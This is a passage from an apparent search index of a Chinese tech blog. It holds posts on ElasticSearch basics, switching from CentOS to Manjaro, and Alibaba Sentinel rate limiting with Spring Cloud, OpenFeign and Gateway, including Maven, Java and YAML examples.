10 分钟，如果超出则继续没有马赛克减少 其他说明 如果背景是网格图案，则可以处理整个屏幕 如果视频质量太低，则无法检测到马赛克，并且不会显示效果 无法播放受 DRM 保护的视频，但可以使用实时捕获来处理它们 它支持 mp4、wmv、mkv、avi、jpg、png，但有些视频由于编解码器而无法播放 产品缺点 无法恢复预镶嵌状态 存在图像质量低的旧视频或具有特殊马赛克处理的视频的不良情况 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"ai"},{title:"ElasticSearch 入门教程 - 基础篇",url:"/posts/5ab118a5.html",text:'ElasticSearch 的概述 ElasticSearch 是基于 RESTful 标准的高扩展高可用的实时数据分析的全文搜索工具。它提供了一个分布式多用户能力的全文搜索引擎，基于 RESTful 接口。ElasticSearch 是在 Lucene 的基础上用 Java 开发的，并作为 Apache 许可条款下的开放源码发布，是当前流行的企业级搜索引擎。Elasticsearch 在云计算中，拥有实时搜索、稳定、可靠、快速、安装使用方便等优势。构建在全文检索开源软件 Lucene 之上的 Elasticsearch，不仅能对海量规模的数据完成分布式索引与检索，还能提供数据聚合分析的功能。 ElasticSearch 的基本概念 Index - 类似于 MySQL 数据库中的 database Type - 类似于 MySQL 数据库中的 table，ES 中可以在 Index 中建立 Type，通过 mapping 进行映射 Document - 由于 ES 存储的数据是文档类型的，一条数据对应一个文档，相当于 MySQL 数据库中的一行数据 row Field - ES 中一个文档中可以有多个字段，相当于 MySQL 数据库一行可以有多列 Mapping - 可以理解为 MySQL 或者 Solr 中对应的 schema，只不过有些时候 ES 中的 mapping 增加了动态识别功能，实际生产环境上不建议使用，最好还是开始就制定好了对应的 schema Indexed - 名义上的索引建立，MySQL 中一般会对经常使用的列增加相应的索引用于提高查询速度，而在 ES 中默认都是会加上索引的，除非特殊制定不建立索引只是进行存储用于展示，这个需要根据具体的需求和业务进行设定 Query DSL - 类似于 MySQL 的 SQL 语句，只不过在 ES 中是使用的 JSON 格式的查询语句，即 QueryDSL ElasticSearch 的基本架构 Gateway 层：ES 用来存储索引文件的一个文件系统且它支持很多类型，例如：本地磁盘、共享存储（做 Snapshot 的时候需要用到）、Hadoop 的 HDFS 分布式存储、亚马逊的 S3。它的主要职责是用来对数据进行长持久化以及整个集群重启之后可以通过 Gateway 重新恢复数据。 Distributed Lucene Directory：Gateway 上层就是一个 Lucene 的分布式框架，Lucene 是做检索的，但是它是一个单机的搜索引擎，像这种 ES 分布式搜索引擎系统，虽然底层用 Lucene，但是需要在每个节点上都运行 Lucene 进行相应的索引、查询以及更新，所以需要做成一个分布式的运行框架来满足业务的需要。 四大模块组件：Districted Lucene Directory 之上就是一些 ES 的模块，Index Module 是索引模块，就是对数据建立索引也就是通常所说的建立一些倒排索引等；Search Module 是搜索模块，就是对数据进行查询搜索；Mapping 模块是数据映射与解析模块，就是你的数据的每个字段可以根据你建立的表结构通过 Mapping 进行映射解析，如果没有建立表结构，ES 就会根据数据类型推测数据结构之后自己生成一个 Mapping，然后都是根据这个 Mapping 进行解析数据；River 模块在 ES2.0 之后应该是被取消了，它的意思表示是第三方插件，例如可以通过一些自定义的脚本将传统的数据库（MySQL）等数据源通过格式化转换后直接同步到 ES 集群里，这个 River 大部分是自己写的，写出来的东西质量参差不齐，将这些东西集成到 ES 中会引发很多内部 Bug，严重影响了 ES 的正常应用，所以在 ES2.0 之后考虑将其去掉。 Discovery、Scripting：ES 四大模块组件之上有 Discovery 模块：ES 是一个集群包含很多节点，很多节点需要互相发现对方，然后组成一个集群包括选主的，这些 ES 都是用的 Discovery 模块，默认使用的是 Zen，也可是使用 EC2；ES 查询还可以支撑多种 Script 即脚本语言，包括 Mvel、JS、Python 等。 Transport 协议层：再上一层就是 ES 的通讯接口 Transport，支持的也比较多：Thrift、Memcached 以及 Http，默认的是 Http，JMX 就是 Java 的一个远程监控管理框架，因为 ES 是通过 Java 实现的。 RESTful 接口层：最上层就是 ES 暴露出来的访问接口，官方推荐的方案就是这种 RESTful 接口，直接发送 Http 请求，方便后续使用 Nginx 做代理、分发包括可能后续会做权限的管理，通过 Http 很容易做这方面的管理。如果使用 Java 客户端它是直接调用 Api，在做负载均衡以及权限管理还是不太好做。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"分布式"},{title:"Manjaro 入坑前的碎碎念",url:"/posts/3d242d5c.html",text:'CentOS 使用体验 使用 Linux 系统已经很多年了，CentOS/Debian/Ubuntu 都有接触过，其中 CentOS 使用的时间最长了，从 CentOS6 到 CentOS7 陆陆续续用了有六七年。抛开其他方面不说，Debian/Ubuntu 都是很优秀的 Linux 发行版，由于这么多年来公司的服务器都是标配 CentOS，因此当初为了踩更多的坑，就一直坚持使用 CentOS。当年的目标很单纯也很纯粹，为的就是希望在企业的生产环境更能得心应手。CentOS 继承了 RedHat 的血统，无论是作为企业服务器还是日常使用的开发机，都能胜任大多数使用场景了。唯一需要吐槽的可能就是内核版本很低、软件版本比较旧、软件资源少，但正是这样才凸显了 CentOS 的稳定性，毕竟对企业服务器来说，稳定性压倒一切。如果希望得到像 Arch、Deppin、Elementary OS 那样拥有炫酷界面、丰富的软件、滚动更新等特性，那么 CentOS 确实不适合这类用户。CentOS 默认使用 GNOME 作为桌面环境，而 GNOME Shell 的社区拥有大量开源插件，因此花点时间也可以将 CentOS 折腾得比较满意。例如经过显卡驱动优化、GNOME 桌面美化、输入法更换、壁纸更换、配置 Zsh、Guake 后，可以达到比较满意的界面体验，而 CentOS 桌面软件少的问题，也可以通过 Snap、Flatpak 间接得到缓解。 放弃 CentOS 的原因 由于笔者在 2019 年 9 月初更换了一款超宽屏的显示器，同时也升级了显卡，硬件升级之后想当然地希望获得更好的使用体验。当时已经开始不满足于 CentOS 的现状了，于是心中萌发了转投 Manjaro 的想法，但原 CentOS 系统里已经搭建了日常使用的开发环境（包括各种编程环境、IDE、工具链等），对于懒癌晚期的笔者来说，更换系统意味着重新搭建开发环境，因此更换系统的事情就被搁置了。刚好 CentOS 官方在 2019 年 10 月发布了 CentOS8 和 CentOS Streams，加入了大量的新特性，是一款非常值得期待的 Linux 系统。遗憾的是 CentOS 官方向来不支持大版本更新，也就是无法从 CentOS7 直接更新到 CentOS8。如果非得使用 CentOS8 的话，此时只能重新全盘安装，而全盘安装也意味着以前的开发环境还是要重新搭建。试想一下，要是多年以后 CentOS9 发布了，岂不是又要重新安装嘛。考虑到硬件升级 + Centos8 系统发布带来的契机，转投 Manjaro 的转折点终于到了，但是笔者并不是以后都不使用 CentOS，只是在自己的开发机上不再安装 CentOS，日后的工作中依然是离不开 CentOS 系统。 转投 Manjaro 的原因 Manjaro 解决了笔者最重要的两个痛点，一是支持稳定的滚动更新，二是社区拥有大量的软件（AUR、Snap、Flatpak），而且官方默认提供了三款（XFCE、KDE、GNOME）优秀的桌面环境，社区也有提供多款非常优秀的桌面环境（MATE、Bspwm、Budgie、Cinnamon、Deepin）。 Manjaro 的优点 WiKi 非常完善 丰富的桌面环境 稳定的滚动更新 可定制化程度高 AUR，软件资源丰富 硬件设定及内核管理支持 未完待续 先写到这里，等更换了 Manjaro 再唠叨，毕竟安装新的系统后，还需要一段较长的磨合时间才能用得爽，不过拖延症蛮严重的，也不知道哪天才能真的转投 Manjaro 。。。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"manjaro"},{title:"Sentinel 入门教程 - 整合篇",url:"/posts/63e3926c.html",text:'前言为了减少开发的复杂度，Sentinel 对大部分的主流框架，例如 Web Servlet、Dubbo、Spring Cloud、gRPC、Spring WebFlux，Reactor 等都做了适配，只需要引入对应的依赖即可方便的整合 Sentinel。如果要实现 Spring Cloud 和 Sentinel 的整合，可以通过引入 Spring Cloud Alibaba Sentinel 来整合 Sentinel。Spring Cloud Alibaba 是阿里巴巴开源的，致力于提供微服务开发的一站式解决方案。Spring Cloud Alibaba 默认为 Sentinel 整合了 Servlet、RestTemplate、FeignClient 和 Spring WebFlux。Sentinel 在 Spring Cloud 生态中，不仅补全了 Hystrix 在 Servlet 和 RestTemplate 这一块空白，而且还完全兼容了 Hystrix 在 FeignClient 中限流降级的用法，并且支持运行时灵活地配置和调整限流降级规则。 Sentinel 整合 Spring Cloud1.0、版本说明本案例使用各开源组件的版本说明如下，点击下载完整的案例代码 Sentinel 1.8.0 Spring Boot 2.1.18.RELEASE Spring Cloud Greenwich.SR6 Spring Cloud Alibaba Sentinel 2.1.3.RELEASE 1.1、引入 Maven 依赖添加 spring-cloud-starter-alibaba-sentinel 依赖 1234567891011121314151617181920212223242526272829303132&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.1.18.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;properties&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;spring-cloud.version&gt;Greenwich.SR6&lt;/spring-cloud.version&gt; &lt;spring-cloud-starter-sentinel&gt;2.1.3.RELEASE&lt;/spring-cloud-starter-sentinel&gt;&lt;/properties&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;${spring-cloud.version}&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-sentinel&lt;/artifactId&gt; &lt;version&gt;${spring-cloud-starter-sentinel}&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 1.2、创建主启动类1234567@SpringBootApplicationpublic class SentinelApplication { public static void main(String[] args) { SpringApplication.run(SentinelApplication.class, args); }} 1.3、创建 Controller 测试类12345678910111213141516171819202122232425262728@RestControllerpublic class TestController { /** * 定义资源 * value：资源名称 * blockHandler：限流处理的方法 * * @return */ @SentinelResource(value = "Hello", blockHandler = "exceptionHandler") @GetMapping("/hello") public String hello() { // 使用限流规则 return "Hello Sentinel!"; } /** * 原方法被限流的时候调用此方法 * * @param e * @return */ public String exceptionHandler(BlockException e) { e.printStackTrace(); return "系统繁忙，请稍候 ..."; }} 1.4、配置 Sentinel 控制台在 application.yml 配置文件里，指定 Sentinel 控制台的地址和端口 12345678910server: port: 8080spring: application: name: sentinel-spring-cloud cloud: sentinel: transport: dashboard: 127.0.0.1:9000 1.5、测试代码 1）启动 Sentinel 控制台 1$ java -Dserver.port=9000 -jar sentinel-dashboard-1.8.0.jar 2）启动 Spring Cloud 应用，浏览器访问 http://127.0.0.1:8080/hello，若响应结果返回 Hello Sentinel!，说明应用启动成功 3）浏览器访问 http://127.0.0.1:9000，打开 Sentinel 控制台，动态添加流控规则，如下图所示： 4）浏览器再次访问 http://127.0.0.1:8080/hello，当快速刷新页面时，请求的响应结果变为 系统繁忙，请稍后 ...，，则说明 Sentinel 的流控规则生效了 Sentinel 整合 OpenFeignSentinel 适配了 OpenFeign 组件，如果想使用，除了引入 spring-cloud-starter-alibaba-sentinel 依赖之外，还需要以下两个步骤： 在配置文件里打开 Sentinel 对 OpenFeign 的支持：feign.sentinel.enabled=true 加入 spring-cloud-starter-openfeign 依赖使 Sentinel starter 中的自动化配置类生效 2.0、版本说明本案例使用各开源组件的版本说明如下，其中服务注册中心使用 Nacos，若改为使用 Eureka，只需要在案例里将 Nacos 相关的配置（Maven 依赖 + YAML 配置）替换掉即可，点击下载完整的案例代码 Sentinel 1.8.0 Nacos Server 1.4.0 Spring Boot 2.1.18.RELEASE Spring Cloud Greenwich.SR6 Spring Cloud Alibaba Sentinel 2.1.3.RELEASE Spring Cloud Alibaba Nacos Config 2.1.3.RELEASE 2.1、案例目标实现 sentinel-consumer 微服务通过 OpenFeign 访问 sentinel-provider 微服务时的流量控制 2.2、准备工作启动 Sentinel 控制台 1$ java -Dserver.port=9000 -jar sentinel-dashboard-1.8.0.jar 启动 Nacos Server，并在 Nacos Server 的控制面台里，创建名称为 dev 的命名空间 2.3、创建 Maven 父工程创建 Maven 父工程，配置好工程需要的父级依赖，目的是为了更方便管理与简化配置 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.1.18.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;properties&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;spring-cloud.version&gt;Greenwich.SR6&lt;/spring-cloud.version&gt; &lt;spring-cloud-starter-sentinel&gt;2.1.3.RELEASE&lt;/spring-cloud-starter-sentinel&gt; &lt;spring-cloud-starter-nacos.version&gt;2.1.3.RELEASE&lt;/spring-cloud-starter-nacos.version&gt;&lt;/properties&gt;&lt;!-- 管理依赖 --&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;${spring-cloud.version}&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-sentinel&lt;/artifactId&gt; &lt;version&gt;${spring-cloud-starter-sentinel}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;version&gt;${spring-cloud-starter-nacos.version}&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;!-- 利用传递依赖，公共部分 --&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 2.4、创建 Sentinel Provider 工程引入 Maven 依赖 123456&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 创建主启动类，添加 @EnableDiscoveryClient 注解，启用服务发现功能，并将服务注册到 Nacos 12345678@SpringBootApplication@EnableDiscoveryClientpublic class ProviderApplication { public static void main(String[] args) { SpringApplication.run(ProviderApplication.class, args); }} 创建 Controller 测试类 1234567891011@RestControllerpublic class ProviderController { private Logger LOG = LoggerFactory.getLogger(ProviderController.class); @GetMapping("/hello") public String hello() { LOG.info("provider invoke ... "); return "Hello Sentinel!"; }} 创建 application.yml 配置文件，添加 Nacos 注册中心的地址和端口等信息 1234567891011121314server: port: 8080 servlet: context-path: /providerspring: application: name: sentinel-provider cloud: nacos: discovery: server-addr: 127.0.0.1:8848 namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18 cluster-name: DEFAULT 2.5、创建 Sentinel Consumer 工程引入 Maven 依赖，包括 spring-cloud-starter-openfeign、spring-cloud-starter-alibaba-sentinel 1234567891011121314&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-sentinel&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 创建 Feign Client 的接口类 123456@FeignClient(value = "sentinel-provider", fallback = FallbackService.class)public interface FeignAgent { @GetMapping("/provider/hello") public String hello();} 创建处理限流、降级的回调类 12345678@Componentpublic class FallbackService implements FeignAgent { @Override public String hello() { return "系统繁忙，请稍候 ..."; }} 创建主启动类，添加 @EnableDiscoveryClient、@EnableFeignClients 注解 123456789@SpringBootApplication@EnableDiscoveryClient@EnableFeignClientspublic class ConsumerApplication { public static void main(String[] args) { SpringApplication.run(ConsumerApplication.class, args); }} 创建 Controller 测试类 1234567891011121314@RestControllerpublic class ConsumerController { @Autowired private FeignAgent feignAgent; private Logger LOG = LoggerFactory.getLogger(ConsumerController.class); @GetMapping("/hello") public String hello() { LOG.info("consumer invoke ... "); return feignAgent.hello(); }} 创建 application.yml 配置文件，添加 Nacos 注册中心的地址和端口等信息，并启用 Sentinel 对 OpenFeign 的支持 123456789101112131415161718192021server: port: 8082 servlet: context-path: /consumerspring: application: name: sentinel-consumer cloud: nacos: discovery: server-addr: 127.0.0.1:8848 namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18 cluster-name: DEFAULT sentinel: transport: dashboard: 127.0.0.1:9000feign: sentinel: enabled: true 2.6、测试代码 1）分别启动 sentinel-consumer、sentinel-provider 应用 2）浏览器访问 http://127.0.0.1:8082/consumer/hello，若响应结果为 Hello Sentinel!，说明两个应用启动成功，同时在 Nacos 的控制台可以看到已经有两个服务注册了，如下图所示： 3）浏览器访问 http://127.0.0.1:9000，打开 Sentinel 的控制台，动态添加流控规则，如下图所示： 特别注意：Sentinel 与 Feign 整合时，流控规则的编写格式为 HTTP请求方式:协议://服务名/请求路径跟参数，例如：GET:http://sentinel-provider/provider/hello 4）浏览器再次访问 http://127.0.0.1:8082/consumer/hello，当快速刷新页面时，请求的响应结果变为 系统繁忙，请稍后 ...，则说明 sentinel-consumer 微服务通过 OpenFeign 访问 sentinel-provider 微服务时，Sentinel 的流控规则生效了 Sentinel 网关限流Sentinel 支持对 Spring Cloud Gateway、Zuul 1.x、Zuul 2.x 等主流的 API Gateway 进行限流。 Sentinel 整合 Gateway从 1.6.0 版本开始，Sentinel 提供了 Spring Cloud Gateway 的适配模块，可以提供两种资源维度的限流： route 维度：即在 Spring 配置文件中配置的路由条目，资源名为对应的 routeId 自定义 API 维度：用户可以利用 Sentinel 提供的 API 来自定义一些 API 分组 3.0、案例说明本案例是在上述 Sentinel 整合 OpenFeign 案例的基础上开发的，注册中心依旧使用 Nacos，其中主要的变化是新创建了 sentinel-gateway 工程，因此下面只给出新增或者更改后的代码和配置，点击下载完整的案例代码。 3.1、案例目标实现 sentinel-gateway 微服务访问 sentinel-consumer 微服务时的流量控制，其中 sentinel-consumer 微服务通过 OpenFeign 访问 sentinel-provider 微服务时的流量控制在上述 Sentinel 整合 OpenFeign 案例已经实现了，完整的调用流程为 sentinel-gateway –&gt; sentinel-consumer –&gt; sentinel-provider。 3.2、准备工作启动 Sentinel 控制台 1$ java -Dserver.port=9000 -jar sentinel-dashboard-1.8.0.jar 启动 Nacos Server，并在 Nacos Server 的控制面台里，创建名称为 dev 的命名空间 3.3、更改 Maven 父工程添加 spring-cloud-alibaba-sentinel-gateway 依赖 123456789&lt;properties&gt; &lt;spring-cloud-starter-sentinel&gt;2.1.3.RELEASE&lt;/spring-cloud-starter-sentinel&gt;&lt;/properties&gt;&lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-alibaba-sentinel-gateway&lt;/artifactId&gt; &lt;version&gt;${spring-cloud-starter-sentinel}&lt;/version&gt;&lt;/dependency&gt; 3.4、创建 Sentinel Gateway 工程引入 Maven 依赖 123456789101112131415161718&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-sentinel&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-alibaba-sentinel-gateway&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 创建 Gateway 的配置类，用于定义被限流或者降级时处理的方法 12345678910111213141516171819@Configurationpublic class GatewayConfiguration { /** * 初始化 */ @PostConstruct public void init() { // 设置被限流或者降级处理时的回调方法 GatewayCallbackManager.setBlockHandler(new BlockRequestHandler() { // 被限流或者降级时处理的方法 @Override public Mono&lt;ServerResponse&gt; handleRequest(ServerWebExchange serverWebExchange, Throwable throwable) { return ServerResponse.status(200).syncBody("系统繁忙，请稍后 ..."); } }); }} 创建主启动类，添加 @EnableDiscoveryClient 注解 12345678@SpringBootApplication@EnableDiscoveryClientpublic class GatewayApplication { public static void main(String[] args) { SpringApplication.run(GatewayApplication.class, args); }} 创建 application.yml 配置文件，由于这里指定了 context-path，因此在路由规则配置中需要使用 StripPrefix 参数将访问进来的 URL 中的 context-path 截取掉，否则 sentinel-gateway 微服务访问 sentinel-consumer 微服务时，会出现 404 错误 12345678910111213141516171819202122232425server: port: 8083 servlet: context-path: gatewayspring: application: name: sentinel-gateway cloud: nacos: discovery: server-addr: 127.0.0.1:8848 namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18 cluster-name: DEFAULT sentinel: transport: dashboard: 127.0.0.1:9000 gateway: routes: - id: sentinel-gateway-route uri: lb://sentinel-consumer predicates: - Path=/${server.servlet.context-path}/consumer/hello/** filters: - StripPrefix=1 若在 application.yml 配置文件里没有配置 context-path，那么路由规则配置可以使用以下的写法： 1234567891011server: port: 8083spring: cloud: gateway: routes: - id: sentinel-gateway-route uri: lb://sentinel-consumer predicates: - Path=/consumer/hello/** 3.5、测试代码 1）分别启动 sentinel-gateway、sentinel-consumer、sentinel-provider 应用 2）浏览器访问 http://127.0.0.1:8083/gateway/consumer/hello，若响应结果为 Hello Sentinel!，说明三个应用启动成功，同时在 Nacos 的控制台可以看到已经有三个服务注册了，如下图所示： 3）这里让 Sentinel 基于 Route 维度进行网关限流，浏览器访问 http://127.0.0.1:9000，打开 Sentinel 的控制台，在 sentinel-gateway 服务里动态添加网关流控规则，其中 API 名称就是 application.yml 配置文件里的路由 ID，如下图所示： 4）浏览器再次访问 http://127.0.0.1:8083/gateway/consumer/hello，当快速刷新页面时，请求的响应结果变为 系统繁忙，请稍后 ...，则说明 sentinel-gateway 微服务访问 sentinel-consumer 微服务时，Sentinel 的网关流控规则生效了 3.6、使用自定义 API 进行限流从 1.6.0 版本开始，Sentinel 提供了 Spring Cloud Gateway 的适配模块，可以提供两种资源维度的限流： route 维度：即在 Spring 配置文件中配置的路由条目，资源名为对应的 routeId 自定义 API 维度：用户可以利用 Sentinel 提供的 API 来自定义一些 API 分组 1）在 Sentinel 控制台里，删除所有与 sentinel-gateway 应用相关的网关流控规则 2）在 Sentinel 控制台的菜单栏里找到 sentinel-gatway -&gt; API 管理 -&gt; 新增 API 分组，由于上面在 application.yml 配置文件中指定了 context-path，因此表单里的” 匹配串” 为 /gateway/consumer/hello/**，” 匹配模式” 选择 前缀 3）在 Sentinel 控制台的菜单栏里找到 sentinel-gatway -&gt; 流控规则 -&gt; 新增网关流控规则，在表单里的 “API 类型” 选择 API 分组，”API 名称” 选择刚刚创建的 API 即可 4）浏览器访问 http://127.0.0.1:8083/gateway/consumer/hello，当快速刷新页面时，请求的响应结果变为 系统繁忙，请稍后 ...，则说明 sentinel-gateway 微服务访问 sentinel-consumer 微服务时，Sentinel 使用自定义 API 成功对网关进行限流了 参考博客 Sentinel 适配主流框架详解 Sentinel 官方文档中的网关限流 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"微服务"},{title:"Sentinel 入门教程 - 中级篇",url:"/posts/e3c83db6.html",text:'上篇 - Sentinel 入门教程（基础篇） Sentinel 入门教程 - 基础篇 前言1.0、版本说明本文针对 Sentinel 1.8.0 及以上版本编写，特别说明除外。由于 1.8.0 版本对熔断降级特性进行了全新的改进升级，建议使用最新版本以更好地利用熔断降级的能力。 1.1、Sentinel 的控制规则Sentinel 的所有规则都可以在内存态中动态地查询与修改，修改之后立即生效，同时 Sentinel 也提供了相关 API 供开发者来定制自己的规则策略。Sentinel 主要支持以下几种规则： 流量控制规则 熔断降级规则 系统保护规则 来源访问控制规则 动态规则扩展 Sentinel 流量控制实现2.0、流量控制概述流量控制（Flow Control），其原理是监控应用流量的 QPS 或者并发线程数等指标，当达到指定的阀值时对流量进行控制，以避免被瞬间的流量高峰冲垮，从而保障应用的高可用性。FlowSlot 会根据预设的规则，结合 NodeSelectorSlot、ClusterBuilderSlot、StatisticSlot 统计出来的实时信息进行流量控制。限流的直接表现是在执行 Entry nodeA = SphU.entry(resourceName) 的时候抛出 FlowException 异常。FlowException 是 BlockException 的子类，可以捕捉 BlockException 来自定义被限流之后的处理逻辑。 2.1、流量控制策略Sentinel 的流量控制策略主要有两种实现方式： 并发线程数：并发线程数限流用于保护业务线程数不被耗尽 QPS：当 QPS 超过某个阀值的时候，则采取措施进行流量控制 2.2、流量控制规则的属性流量控制规则（FlowRule）包含下面几个重要的属性： count：限流阀值 strategy：调用关系限流策略 resource：资源名，即流控规则的作用对象 grade：限流阀值类型（QPS 或者并发线程数） limitApp：流控针对的调用来源，若为 default 则不区分调用来源 controlBehavior：流量整形的控制效果（直接拒绝、Warm Up、匀速排队） 直接拒绝（RuleConstant.CONTROL_BEHAVIOR_DEFAULT）方式是默认的流量控制方式，当 QPS 超过任意规则的阈值后，新的请求就会被立即拒绝，拒绝方式为抛出 FlowException。这种方式适用于对系统处理能力确切已知的情况下，例如通过压测确定了系统的准确水位时。 Warm Up（RuleConstant.CONTROL_BEHAVIOR_WARM_UP）方式，即预热 / 冷启动方式，在系统长期处于低水位的情况下，当流量突然增加时，会直接把系统拉升到高水位，这可能会瞬间把系统拉跨。通过” 冷启动”，让通过的流量缓慢增加，在一定时间内逐渐增加到阈值上限，给冷系统一个预热的时间，避免冷系统被压垮。 匀速排队（RuleConstant.CONTROL_BEHAVIOR_RATE_LIMITER）方式会严格控制请求通过的间隔时间，也即是让请求以均匀的速度通过，对应的是漏桶算法，例如阈值 QPS=2 时，每个 500ms 处理一个请求，假设当前有 10 个请求则需要排队处理 5 秒。 特别注意：同一个资源可以同时拥有多个流控规则，Sentinel 检查规则时会依次检查。 2.3、流量控制规则的设置流量控制规则设置有以下两种方式： 本地代码设置 在 Sentinel 控制台动态设置 2.3.1、代码设置以下只给出流量控制的简单示例代码，若需要更详细的流量控制代码示例，可以点这里 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253@RestControllerpublic class DegradeController { /** * 资源名称 */ private static final String RESOURCE_NAME = "Flow"; /** * @return * @SentinelResource 定义资源 * value：资源名称 * blockHandler：限流处理的方法 